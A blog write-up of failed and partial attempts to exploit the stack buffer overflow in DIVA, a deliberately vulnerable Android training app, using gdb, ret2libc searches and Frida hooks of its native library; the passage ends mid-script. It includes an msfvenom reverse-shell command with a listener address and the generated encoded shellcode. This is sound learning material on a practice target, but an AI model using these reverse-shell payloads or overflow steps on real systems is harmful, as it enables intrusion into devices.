---
layout: post
title: DIVA - Binary From Hell 😈
categories:
  - Mobile
---

<br>So let me clarify one thing straight away, after trying a lot of thing me and KNX was not be able to solve this binary in the intended way, although we are able to do that by manipulating the internal function of the application using FRIDA which is equivalent to Cheating, so the main focus of this blog is to show what are the mistakes and all the FAIL attempt we did and what all things we learned from our journey.
<br>**Let’s Start!!**
<br>So after we notice the application crashed successfully now let’s have a look at logcat
<br>In the terminal open adb logcat and analyze the logs
<br>![14-1](https://teckk2.github.io/assets/images/DIVA/14-1.png)
<br>As you can see the application give the input to the CPU to jump to the location (0x41414141) thus the location address is unknown, which eventually result in crash of the application. And which is also a classic example to exploit a vanilla BOF, let’s exploit and try to get a reverse shell.
<br>For those who don’t know x41 is the hex value for (A)
<br>Now we need to find the offset manually in able to exploit it further, We will try to decrease and keep checking logcat and find in how much strings the address changes
<br>I tried with 35 A’s and I notice the difference of -1 x41
<br>![14-2](https://teckk2.github.io/assets/images/DIVA/14-2.png)
<br>Then I try again with 34 A’s to confirm
<br>![14-3](https://teckk2.github.io/assets/images/DIVA/14-3.png)
<br>We are very close, now try from little backward
<br>![14-4](https://teckk2.github.io/assets/images/DIVA/14-4.png)
<br>The correct offset is 32 because when I tried with 31 A’s it doesn’t crash, but when I tried with 32 A’s the application crashed.  So as we know our offset point, let’s move to the next step
<br>![14-5](https://teckk2.github.io/assets/images/DIVA/14-5.png)
<br>Now we will try with 32 A’s and 4 set of B’s to over write and control the EIP
<br>![14-6](https://teckk2.github.io/assets/images/DIVA/14-6.png)
<br>To proceed with further steps of debugger we need a proper debugger to be attached, so open adb shell and enable gdbserver and connect it remotely 
<br>![14-7](https://teckk2.github.io/assets/images/DIVA/14-7.png)
<br>Make sure you are root, then we will attached the application PID with gdbserver so now we can just connect remotely, but before that we need to forward the port
<br>Open another terminal and run this command with the port you specified 
<br>[**adb forward tcp:8888 tcp:8888**] you may need root permission to run all these commands, so if you face any permission issued don’t forget to run [adb root] before doing all steps
<br>![14-8](https://teckk2.github.io/assets/images/DIVA/14-8.png)
<br>Now everything is setup, initially I tried connect to gdbserver from my kali VM, but I was facing some issue in pivoting the network, then later I installed kali as a windows susbsytem, you can just download kali from Microsoft Store
<br>![14-9](https://teckk2.github.io/assets/images/DIVA/14-9.png)
<br>Once installed run this below command to enable windows subsystem feature, or you can do vice-versa as you wish.
<p class="message">
  Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
</p>
<br>Once kali is setup, you can start updating the repos, and install everything you need like: netcat, gdb, msf or if you need anything else for future use, it’s up to you.
<br>You can also download [GDB](https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32) static binary directly into your android device but in later stage we need gef which have some compatibly issues 
<br>Once you install gdd in your KALI, you can download [gef](https://github.com/hugsy/gef) plugin, to ease our work for this debugging process. 
<br>![14-10](https://teckk2.github.io/assets/images/DIVA/14-10.png)
<br>Now open gdb and connect to the remote local port, as we are now sharing the same network port with the host, there will be no issue connecting to the local port which we forwarded.
<br>![14-11](https://teckk2.github.io/assets/images/DIVA/14-11.png)
<br>![14-12](https://teckk2.github.io/assets/images/DIVA/14-12.png)
<br>![14-13](https://teckk2.github.io/assets/images/DIVA/14-13.png)
<br>As you can see we can’t use run, which restricted us to a limited debugging feature to use only Continue and get all the inputs directly from the application.
<br>![14-14](https://teckk2.github.io/assets/images/DIVA/14-14.png)
<br>![14-15](https://teckk2.github.io/assets/images/DIVA/14-15.png)
<br>I tried to feed first 32 bytes as A’s and 4 bytes of B’s and then lot of C’s and the ESP and EBP is full of our C’s as we can see in our gdb output, this is where we will store our shellcode.
<br>There is one drawback in debugging Android application, every time you crash the application, you need to restart the application, but in our case it restart automatically, but create a new PID every time which means you need to set the gdbserver with the new PID again and again after every crash.
<br>![14-16](https://teckk2.github.io/assets/images/DIVA/14-16.png)
<br>As we already know the offset, the next step is to find jump esp address and bad characters, so we can generate our shellcode and get a reverse shell without any issues. 
<br>After some time, if you face issue of crashing the app regularly, you can just try deleting the cache or app data, and allow full storage access, it may solve your problem as it solved mine.
<br>![14-17](https://teckk2.github.io/assets/images/DIVA/14-17.png)
<br>First let’s find out the esp address where we will jump our shellcode, we will quickly duplicate 500 c’s using python 
<br>![14-18](https://teckk2.github.io/assets/images/DIVA/14-18.png)
<br>And add it after our offset and EIP
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCC
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now setup the gdb and paste this inside application to crash it
<br>![14-19](https://teckk2.github.io/assets/images/DIVA/14-19.png)
<br>![14-20](https://teckk2.github.io/assets/images/DIVA/14-20.png)
<br>Now let’s analyze ESP and see how much space we have for our shellcode and where we can jump to
<br>![14-21](https://teckk2.github.io/assets/images/DIVA/14-21.png)
<br>Looks like we have all the 500 bytes of data to use, perfect now we can move to our next step to find bad characters, and we can use any of the address mention on the left side,
<br>![14-22](https://teckk2.github.io/assets/images/DIVA/14-22.png)
<br>The safest option is to leave the first 16 bytes as nop slides(\x90) and put your shellcode from 0xbf7fc760: or whatever address you have in your system respectively. 
<br>But the complexity in this binary is, if you feed an ascii character, then the CPU will convert it to UTF8-hex by itself, but if you try to feed a hex value for example; if you try to feed hex value of C which is 43, the CPU will convert it to hex itself and revert the value so, the hex value of 43 should be 3433 but the CPU will revert it and show us like 3334 which means the ascii is 34, this is very complex but easy if you understand a simple logic.
<br>![14-23](https://teckk2.github.io/assets/images/DIVA/14-23.png)
<br>Now let’s try something and see if it works or not, let’s take a scenario we want to see x90 in $ESP , but the CPU will convert it to 3039, so what should we de?
<br>As we already know CPU is converting everything into UTF8-HEX itself, so we can go one step back and convert x90 into ascii which resemble for **[space]**
<br>![14-24](https://teckk2.github.io/assets/images/DIVA/14-24.png)
<br>Write a simple code to convert hex into ascii, as we want 90 in our registers
<br>Now run and save it into a new file.
<br>![14-25](https://teckk2.github.io/assets/images/DIVA/14-25.png)
<br>Open file and press ctrl+A and you will see just space, as we expected, we are on the right path, now go to the start line and add 32 A’s and 4 B’s
<br>![14-26](https://teckk2.github.io/assets/images/DIVA/14-26.png)
<br>It should look like this, now copy everything and feed it into application and analyze the debugger
<br>![14-27](https://teckk2.github.io/assets/images/DIVA/14-27.png)
<br>![14-28](https://teckk2.github.io/assets/images/DIVA/14-28.png)
<br>Haha, finally I could see the desired result, but it’s still in little endian style did default by CPU
<br>![14-29](https://teckk2.github.io/assets/images/DIVA/14-29.png)
<br>Now we need to find the bad character, after analyzing I understand that the application only allow ascii characters to be as input, so if we feed anything other than ascii it will be messed
<br>![14-30](https://teckk2.github.io/assets/images/DIVA/14-30.png)
<br>So we will only focus on these hex bytes for our future reference
<br>Now remove the \x and make it simple
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2
<br>b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f5051525354555657
<br>58595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>You can convert hex to ascii from any online tool like [Rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
<br>![14-31](https://teckk2.github.io/assets/images/DIVA/14-31.png)
<br>If we convert this hex into ascii it will look like this, but this is also not working, because of special keyboard sign like upper arrow or something similar sign which CPU is not able to identify when feeding directly from the application, so now what we have left is all the keyboard signs and alpha numeric and remove all the keyboard signs.
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>!"#$%&'()\*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\]^\_\`abcdefghijklmnopqrs
<br>tuvwxyz{|}~
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now convert it to hex
<br>![14-32](https://teckk2.github.io/assets/images/DIVA/14-32.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>!"#$%&'()\*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\]^\_\`abcdefghijklmnopqrs
tuvwxyz{|}~
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br> 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c
<br>3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a
<br>5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78
<br>79 7a 7b 7c 7d 7e 7f
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>This is the final hex what we can use for our payload but before that we need to find bad char inside it.
<br>While doing so I found that when feeding the application with this
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!"#$%&'()\*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO
<br>PQRSTUVWXYZ\[\]^\_\`abcdefghijklmnopqrstuvwxyz{|}~
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-33](https://teckk2.github.io/assets/images/DIVA/14-33.png)
<br>The system inverted the hex
<br>![14-34](https://teckk2.github.io/assets/images/DIVA/14-34.png)
<br>![14-35](https://teckk2.github.io/assets/images/DIVA/14-35.png)
<br>As we already know the CPU is doing little endian itself, so we need to use a trick method, we need to reverse this process and feed the system by doing little endian our self and when system will do the same process it will come aligned.
<br>You can do the same process in python also, but I am showing you in text editor so it will be simple to understand for those who don’t know.
<br>First divide the hex values in section of 4bytes
<br>![14-36](https://teckk2.github.io/assets/images/DIVA/14-36.png)
<br>Now start writing in inverted form, for example 
<br>21222324 will become 24232221
<br>Now do it for all the section of 4 bytes and combine it in one
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>24232221282726252c2b2a29302f2e2d34333231383736353c3b3a39403f3e3d44434241484746454c4b4
<br>a49504f4e4d54535251585756555c5b5a59605f5e5d64636261686766656c6b6a69706f6e6d7473727178
<br>7776757c7b7a797f7e7d
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now convert it to ascii
<br>And our final payload will look like this
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB$#"!('&%,+\*)0/.-43218765<;:9@?>=DCBAHGFELKJIPONM
<br>TSRQXWVU\[ZY\`\_^]dcbahgfelkjiponmtsrqxwvu|{zy~}
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-37](https://teckk2.github.io/assets/images/DIVA/14-37.png)
<br>![14-38](https://teckk2.github.io/assets/images/DIVA/14-38.png)
<br>![14-39](https://teckk2.github.io/assets/images/DIVA/14-39.png)
<br>As you can see everything is properly aligned and we found no bad characters in it, apart from the hex we didn’t use that will eventually come in bad characters
<br>Bad character:-
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16
<br>\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
<br>8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa
<br>4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb
<br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
<br>\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea
<br>\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>**MSF**
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.103 LPORT:4455 -a x86 -b 
<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16
<br>\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
<br>8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa
<br>4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb
<br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
<br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
<br>xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff -e x86/unicode_mixed -f python
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-40](https://teckk2.github.io/assets/images/DIVA/14-40.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49
<br>\x41\x49\x41\x49\x41\x49\x41\x34\x34\x34\x34\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42
<br>\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41
<br>\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51
<br>\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a
<br>\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39\x75\x34\x4a\x42\x30\x31
<br>\x47\x6b\x48\x77\x4b\x33\x71\x43\x6e\x63\x70\x53\x62\x4a\x6a\x62\x75\x39\x79\x51\x78
<br>\x30\x30\x66\x78\x4d\x61\x70\x45\x43\x50\x59\x56\x50\x6d\x6f\x38\x4d\x55\x30\x50\x49
<br>\x70\x79\x6b\x49\x30\x68\x59\x30\x76\x48\x6b\x51\x4f\x77\x61\x58\x6b\x52\x4b\x50\x4b
<br>\x61\x4f\x6c\x65\x39\x48\x61\x44\x70\x63\x36\x32\x30\x52\x31\x50\x53\x66\x53\x39\x73
<br>\x74\x49\x47\x71\x68\x4d\x55\x30\x72\x32\x72\x48\x42\x4e\x6c\x6f\x30\x73\x43\x38\x53
<br>\x38\x4e\x4f\x4c\x6f\x63\x32\x50\x69\x51\x79\x58\x63\x51\x42\x50\x53\x63\x59\x57\x71
<br>\x56\x50\x6a\x6b\x78\x4d\x63\x50\x41\x41
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now invert the payload as we did earlier to generate our ASCII 
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>49414941494149414941494149414941494149414941494149414941343434346a5841514144415a41424
<br>152414c41594149415141494151414941684141415a3141494149414a3131414941494142414241425149
<br>3141495149414951493131314149414a5159415a4241424142414241426b4d4147423975344a423031476
<br>b48774b3371436e637053624a6a627539795178303066784d61704543505956506d6f384d553050497079
<br>6b493068593076486b514f7761586b524b504b614f6c65394861447063363230523150536653397374494
<br>771684d553072327248424e6c6f3073433853384e4f4c6f6332506951795863514250536359577156506a
<br>6b784d63504141
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>But the payload didn’t work as expected, I even disabled the ASLR from the android device, but still no result.
<br>![14-41](https://teckk2.github.io/assets/images/DIVA/14-41.png)
<br>[https://simoneaonzo.it/gdb-android/](https://simoneaonzo.it/gdb-android/)
<br>[https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html](https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html)
<br>[https://wladimir-tm4pda.github.io/porting/debugging_native.html](https://wladimir-tm4pda.github.io/porting/debugging_native.html)
<br>[https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables](https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables)
<br>[https://www.contextis.com/us/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library](https://www.contextis.com/us/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library)
<br>[https://www.youtube.com/watch?v=WvPJjQR3LJE](https://www.youtube.com/watch?v=WvPJjQR3LJE)
<br>[https://www-zeuthen.desy.de/unix/unixguide/infohtml/gdb/Character-Sets.html](https://www-zeuthen.desy.de/unix/unixguide/infohtml/gdb/Character-Sets.html)
<br>[https://www.utf8-chartable.de/unicode-utf8-table.pl?number=1024&utf8=0x](https://www.utf8-chartable.de/unicode-utf8-table.pl?number=1024&utf8=0x)
<br>After reading a lot of blogs and trying a lot of different methods, later I realize there is NX (No-Execute) bit enabled in the binary which restrict us from executing anything in stack. 
<br>Later I even tried Ret2libc but because of the character restriction, we can’t jump to our system address.
<p class="message">
  <br>am start -n jakhar.aseem.diva/.InputValidation3Activity (name=jakhar.aseem.diva/jakhar.aseem.diva.InputValidation3Activity)
  <br>(gdb) find &system,+9999999,"/bin/sh"
  <br>0xaad6d62e <.L.str.7+7>
  <br>1 pattern found.
  <br>/bin/sh = 0xa619a62e
  <br>/system/bin/sh = 0xa619a627
</p>
<br>After trying to find a lot of new methods, we finally decided to stick and focus on [Frida](https://frida.re/docs/android/), [Frida release](https://github.com/frida/frida/releases)
<br>Let’s download Frida and push it into the device
<br>![14-42](https://teckk2.github.io/assets/images/DIVA/14-42.png)
<br>![14-43](https://teckk2.github.io/assets/images/DIVA/14-43.png)
<br>![14-44](https://teckk2.github.io/assets/images/DIVA/14-44.png)
<br>I changed the name for our convenience 
<br>![14-45](https://teckk2.github.io/assets/images/DIVA/14-45.png)
<br>Now either we can run Frida server directly from outside using adb shell command 
<br>[adb shell "/data/local/tmp/frida-server &"]
<br>Or we can go inside the shell and run from there
<br>![14-46](https://teckk2.github.io/assets/images/DIVA/14-46.png)
<br>When you run there will be no response or interactive response you will see, which a default nature of Frida.
<br>To fasten the thing KNX made a small script to ease the things for us or we can as usual try everything manual whatever you feel good
<br>![14-47](https://teckk2.github.io/assets/images/DIVA/14-47.png)
<br>The next method we tried was hooking **[SpannableStringBuilder](https://developer.android.com/reference/android/text/SpannableStringBuilder)** and replace the input 
<br>bytes to the address we want in EIP using Frida, but unfortunately it didn’t work and we face the same utf-8 hex conversion issue.
<br>As we already know that all the problem is created by that one function which converts our input into UTF-8 so we tried to bypass that
<br>In detail our issue can be understand by this:
<br>![14-48](https://teckk2.github.io/assets/images/DIVA/14-48.png)
<br>Digging deeper with a mix of debugging and hooking we tried to hook a lot of functions before found we find the culprit.
<br>First Idea was the methods toString() is the root cause of the issue because everytime u try to print an object (like editText.getText()) or u try to concatenate string with editText.getText() INTERNALLY java apply toString() but If it be applied to our string, when we send not ascii bytes, it have to returns empty string (like java tostring official documentation). Sadly it didn't happen.
<br>At this point we had to pause to understand how android apps work at a low level and how it is possible to run native C code in an app, as we know that it is not possible to exploit a memory corruption vulnerability in a Java application and this means that somehow native code is executed.
<p class="message">
  [ JNI is the Java Native Interface. It defines a way for the bytecode that Android compiles from managed code (written in the Java or Kotlin programming languages) to interact with native code (written in C/C++). ]
</p>
<br>[https://developer.android.com/training/articles/perf-jni](https://developer.android.com/training/articles/perf-jni)
<br>Now before we proceed further I would recommend you to do complete this Frida-boot workshop for beginners by **Leon Jacobs**. Which will help us understand the concepts more easily which we are going to perform in later stage. [https://www.youtube.com/watch?v=CLpW1tZCblo](https://www.youtube.com/watch?v=CLpW1tZCblo)
<br>Now we tried to Reverse the native library
<br>We unzipped APK again in search of native lib, and we found it: libdivajni.so
<br>![14-49](https://teckk2.github.io/assets/images/DIVA/14-49.png)
<br>Then we tried to hook it, first thing we tried to print lib load address with this simple Js script which KNX wrote:
<br>![14-50](https://teckk2.github.io/assets/images/DIVA/14-50.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {
<br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libnative_addr is: " + libnative_addr)
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-51](https://teckk2.github.io/assets/images/DIVA/14-51.png)
<br>Now we gave the native address 
<br>Now I need to find exported functions. I used IDA for this task
<br>![14-52](https://teckk2.github.io/assets/images/DIVA/14-52.png)
<br>Select the file
<br>Then select the correct function
<br>![14-53](https://teckk2.github.io/assets/images/DIVA/14-53.png)
<br>![14-54](https://teckk2.github.io/assets/images/DIVA/14-54.png)
<br>Now we will hook the **Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence** function
<br>First of all KNX wrote a script to understand how to interact with the native external library and print the address where it is loaded in memory.
<br>![14-55](https://teckk2.github.io/assets/images/DIVA/14-55.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {
<br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var string_with_jni_addr = Module.findExportByName("libdivajni.so","Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence")
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("DivaJni_initiateLaunchSequence address is: " + string_with_jni_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>And it worked perfectly
<br>Then he created a script that allocates space in memory where to write our string in bytes to trigger the buffer overflow and replace the return value of the function with the pointer to our bytes array just created.
<br>![14-56](https://teckk2.github.io/assets/images/DIVA/14-56.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {                                                                                                                                                             <br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")                                                                                         <br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var string_with_jni_addr = Module.findExportByName("libdivajni.so",
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence")
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("DivaJni_initiateLaunchSequence address is: " + string_with_jni_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;};
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(string_with_jni_addr, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(retval));
<br>&nbsp;&nbsp;&nbsp;&nbsp;}                                                                                                                                                     <br>&nbsp;&nbsp;&nbsp;&nbsp;})                                                                                                                                                }) <br>&nbsp;&nbsp;}                                                                                                     }
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>The result was that by pressing the red button of the app, when the return value of the function was replaced, we did not cause any buffer overflow, but it altered the operation of the app, because instead of exiting the popup with denied access, the popup with the start of the launch sequence was exited.
<br>Well, that's good, but it wasn't the result we expected…
<br>Let’s Confirm the **UTF8** encoding problem
<br>Now we wanted to verify if the problem is really related to UTF8 conversion, and then KNX made this simple script that read input and print UTF8 HEX value, in this way we can compare the value that we found in EIP (that differ to what we send) with the output of this script to understand if the conversion were made is UTF8 from string
<br>![14-57](https://teckk2.github.io/assets/images/DIVA/14-57.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var string_with_jni_addr = Module.findExportByName("libdivajni.so",
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence")
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("DivaJni_initiateLaunchSequence address is: " + string_with_jni_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
